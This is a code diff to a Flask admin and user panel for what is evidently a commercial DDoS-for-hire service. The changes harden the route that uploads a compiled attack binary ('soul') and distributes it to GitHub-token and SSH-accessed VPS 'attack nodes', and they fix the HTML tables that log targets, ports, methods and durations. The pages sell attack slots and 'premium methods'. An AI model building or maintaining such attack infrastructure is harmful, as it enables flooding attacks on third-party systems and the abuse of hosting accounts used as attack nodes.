@@ -18,6 +18,10 @@ from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))
+app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50 MB for binary upload
+
+# Ensure keys directory exists (for VPS .pem files)
+os.makedirs(os.path.join(app.root_path, 'keys'), exist_ok=True)
 
 # ---------- Database: try MongoDB, fallback to SQLite ----------
 USE_MONGO = False
@@ -299,7 +303,7 @@ def distribute_binary_to_github(node, binary_data):
             db_sql.session.commit()
         return True
     except Exception as e:
-        print(e)
+        print(f"GitHub distribution error: {e}")
         return False
 
 def distribute_binary_to_vps(node, binary_data):
@@ -342,7 +346,7 @@ def distribute_binary_to_vps(node, binary_data):
             db_sql.session.commit()
         return True
     except Exception as e:
-        print(e)
+        print(f"VPS distribution error: {e}")
         return False
 
 # ---------- Attack Triggers ----------
@@ -1061,6 +1065,7 @@ def admin_delete_node(node_id):
             flash('Node deleted', 'success')
     return redirect(url_for('admin_nodes'))
 
+# ---------- FIXED BINARY UPLOAD ROUTE ----------
 @app.route('/admin/upload_binary', methods=['POST'])
 @admin_required
 def admin_upload_binary():
@@ -1071,20 +1076,43 @@ def admin_upload_binary():
     if file.filename == '':
         flash('No file selected', 'danger')
         return redirect(url_for('admin_nodes'))
-    binary_data = file.read()
-    if USE_MONGO:
-        nodes = list(attack_nodes_col.find({"enabled": True}))
-    else:
-        nodes = AttackNode.query.filter_by(enabled=True).all()
-    success_count = 0
-    for node in nodes:
-        if node['node_type'] == 'github':
-            if distribute_binary_to_github(node, binary_data):
-                success_count += 1
+    
+    try:
+        binary_data = file.read()
+        if len(binary_data) == 0:
+            flash('Uploaded file is empty', 'danger')
+            return redirect(url_for('admin_nodes'))
+        
+        if USE_MONGO:
+            nodes = list(attack_nodes_col.find({"enabled": True}))
         else:
-            if distribute_binary_to_vps(node, binary_data):
-                success_count += 1
-    flash(f'Binary distributed to {success_count}/{len(nodes)} nodes', 'success')
+            nodes = AttackNode.query.filter_by(enabled=True).all()
+        
+        if not nodes:
+            flash('No enabled nodes to distribute binary', 'warning')
+            return redirect(url_for('admin_nodes'))
+        
+        success_count = 0
+        for node in nodes:
+            try:
+                if node['node_type'] == 'github':
+                    if distribute_binary_to_github(node, binary_data):
+                        success_count += 1
+                    else:
+                        print(f"GitHub distribution failed for {node['name']}")
+                else:
+                    if distribute_binary_to_vps(node, binary_data):
+                        success_count += 1
+                    else:
+                        print(f"VPS distribution failed for {node['name']}")
+            except Exception as e:
+                print(f"Error on node {node['name']}: {e}")
+        
+        flash(f'Binary distributed to {success_count}/{len(nodes)} nodes', 'success')
+    except Exception as e:
+        print(f"Upload error: {e}")
+        flash(f'Error: {str(e)}', 'danger')
+    
     return redirect(url_for('admin_nodes'))
 
 @app.route('/admin/settings', methods=['GET', 'POST'])
@@ -1248,7 +1276,11 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'
 <div class="mt-3"><div class="d-flex justify-content-between"><span>Network Load</span><span>{{ (slots_used/max_slots*100)|round(0) if max_slots>0 else 0 }}%</span></div><div class="progress mt-2" style="height:8px;"><div class="progress-bar bg-info" style="width: {{ (slots_used/max_slots*100) if max_slots>0 else 0 }}%"></div></div></div>
 <div class="row mt-4"><div class="col-6 text-center"><div class="stat-number">{{ slots_used }}</div><div>Slots Used</div></div><div class="col-6 text-center"><div class="stat-number">{{ max_slots }}</div><div>Max Slots</div></div></div>
 <div class="mt-4"><p class="text-muted">Upgrade for 10x Power – More slots, longer duration, premium methods, bigger IP pool.</p><a href="/products" class="btn-neon">⚡ Upgrade Now</a></div></div>
-<div class="glass-card"><h3><i class="fas fa-history me-2"></i> Recent Attacks</h3><div class="table-responsive"><table class="table table-dark table-hover"><thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>{% else %}<tr><td colspan="6" class="text-center">No attacks yet</td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="glass-card"><h3><i class="fas fa-history me-2"></i> Recent Attacks</h3><div class="table-responsive"><table class="table table-dark table-hover"><thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>{% else %}<tr><td colspan="6">No attacks yet</td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+</div>
 <script>document.getElementById('menuToggle').addEventListener('click',()=>document.getElementById('sidebar').classList.toggle('open'));</script>
 </body></html>
 '''
@@ -1320,8 +1352,15 @@ ADMIN_DASHBOARD_HTML = '''
 <div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_attacks }}</div><div>Total Attacks</div></div></div>
 <div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_nodes }}</div><div>Total Nodes</div></div></div>
 <div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ active_nodes }}</div><div>Active Nodes</div></div></div></div>
-<div class="glass-card"><h4>Recent Attacks</h4><div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in recent_attacks %}<tr><td>{{ a.id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M') }}</td></tr>{% endfor %}</tbody></table></div></div>
-<div class="glass-card"><h4>Recent Users</h4><div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Attacks</th><th>Created</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:16] }}...</code></td><td>{{ u.plan }}</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="glass-card"><h4>Recent Attacks</h4><div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in recent_attacks %}<tr><td>{{ a.id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M') }}</td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+<div class="glass-card"><h4>Recent Users</h4><div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Attacks</th><th>Created</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:16] }}...</code></td><td>{{ u.plan }}</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+</div>
 <script>document.getElementById('menuToggle').addEventListener('click',()=>document.getElementById('sidebar').classList.toggle('open'));</script>
 </body></html>
 '''
@@ -1360,7 +1399,11 @@ ADMIN_USERS_HTML = '''
 </style>
 </head>
 <body><div class="container"><div class="glass-card"><h2>User Management</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
-<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Max Concurrent</th><th>Max Duration</th><th>Total Attacks</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:24] }}...</code></td><td>{{ u.plan }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><input type="number" name="max_concurrent" value="{{ u.max_concurrent }}" style="width:70px"><button type="submit" name="action" value="set_limit" class="btn btn-sm btn-primary">Set</button></form></td><td>{{ u.max_duration }}s</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><button type="submit" name="action" value="reset_token" class="btn btn-sm btn-warning">Reset Token</button></form><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline" onsubmit="return confirm('Delete user?')"><button type="submit" name="action" value="delete" class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Max Concurrent</th><th>Max Duration</th><th>Total Attacks</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:24] }}...</code></td><td>{{ u.plan }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><input type="number" name="max_concurrent" value="{{ u.max_concurrent }}" style="width:70px"><button type="submit" name="action" value="set_limit" class="btn btn-sm btn-primary">Set</button></form></td><td>{{ u.max_duration }}s</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><button type="submit" name="action" value="reset_token" class="btn btn-sm btn-warning">Reset Token</button></form><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline" onsubmit="return confirm('Delete user?')"><button type="submit" name="action" value="delete" class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+</div>
 </body></html>
 '''
 
@@ -1374,7 +1417,11 @@ ADMIN_ATTACKS_HTML = '''
 </style>
 </head>
 <body><div class="container"><div class="glass-card"><h2>Attack Logs</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
-<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+</div>
 </body></html>
 '''
 
@@ -1389,7 +1436,11 @@ ADMIN_API_KEYS_HTML = '''
 </head>
 <body><div class="container"><div class="glass-card"><h2>All API Keys</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
 <div class="card bg-dark mb-4"><div class="card-header">Create API Key</div><div class="card-body"><form method="POST" action="/admin/api_keys/create" class="row g-2"><select name="user_id" class="col-md-3"><option value="">Select User</option>{% for uid, uname in users.items() %}<option value="{{ uid }}">{{ uname }}</option>{% endfor %}</select><input type="text" name="name" placeholder="Key name" class="col-md-2"><input type="text" name="whitelist_ips" placeholder="Whitelist IPs (comma)" class="col-md-3"><input type="number" name="expires_days" placeholder="Expiry days (optional)" class="col-md-2"><button type="submit" class="btn btn-primary col-md-2">Create Key</button></form></div></div>
-<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User</th><th>Name</th><th>Key</th><th>Whitelist</th><th>Expires</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for k in keys %}<tr><td>{{ k.id }}</td><td>{{ users[k.user_id] }}</td><td>{{ k.name }}</td><td><code>{{ k.key[:20] }}...</code></td><td>{{ k.whitelist_ips }}</td><td>{{ k.expires_at.strftime('%Y-%m-%d') if k.expires_at else 'Never' }}</td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/api_keys/{{ k.id }}/delete" style="display:inline"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User</th><th>Name</th><th>Key</th><th>Whitelist</th><th>Expires</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for k in keys %}<tr><td>{{ k.id }}</td><td>{{ users[k.user_id] }}</td><td>{{ k.name }}</td><td><code>{{ k.key[:20] }}...</code></td><td>{{ k.whitelist_ips }}</td><td>{{ k.expires_at.strftime('%Y-%m-%d') if k.expires_at else 'Never' }}</td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/api_keys/{{ k.id }}/delete" style="display:inline"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+</div>
 </body></html>
 '''
 
@@ -1408,7 +1459,11 @@ ADMIN_NODES_HTML = '''
 <div class="row g-4"><div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add GitHub Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_github"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="github_token" placeholder="GitHub Token" class="form-control mb-2" required><input type="text" name="github_repo" placeholder="Repo Name (default: InfernoCore)" class="form-control mb-2"><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add GitHub Node</button></form></div></div></div>
 <div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add VPS Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_vps" enctype="multipart/form-data"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="vps_host" placeholder="VPS Host (IP)" class="form-control mb-2" required><input type="number" name="vps_port" placeholder="Port (default 22)" class="form-control mb-2" value="22"><input type="text" name="vps_username" placeholder="Username" class="form-control mb-2" required><input type="password" name="vps_password" placeholder="Password (or leave empty for key)" class="form-control mb-2"><div class="mb-2"><label>SSH Private Key (.pem file) – optional</label><input type="file" name="vps_key_file" class="form-control" accept=".pem,.key"><small class="text-muted">If provided, password will be ignored.</small></div><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add VPS Node</button></form></div></div></div></div>
 <div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary</div><div class="card-body"><form method="POST" action="/admin/upload_binary" enctype="multipart/form-data" class="row g-2"><div class="col-md-8"><input type="file" name="binary" class="form-control bg-dark text-white" required></div><div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload your compiled 'soul' binary. It will be sent to all enabled nodes.</small></div></div>
-<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<td><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody>
+</table>
+</div>
+</div>
+</div>
 </body></html>
 '''
 
